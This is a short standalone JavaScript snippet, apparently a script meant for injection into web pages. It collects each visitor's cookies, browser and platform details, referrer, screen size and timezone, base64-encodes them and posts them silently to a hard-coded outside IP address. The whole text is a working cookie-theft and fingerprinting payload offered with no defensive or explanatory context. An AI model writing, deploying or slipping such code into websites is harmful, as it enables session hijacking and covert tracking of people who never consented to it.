(async()=>{
  const p={
    ua:navigator.userAgent,
    lang:navigator.language,
    plat:navigator.platform,
    ref:document.referrer,
    c:document.cookie,
    scr:[screen.width,screen.height],
    tz:Intl.DateTimeFormat().resolvedOptions().timeZone
  };
  const b64=btoa(unescape(encodeURIComponent(JSON.stringify(p))));
  await fetch("http://56.228.80.85:80/log",{
    method:"POST",
    headers:{"Content-Type":"text/plain"},
    body:b64
  });
})();
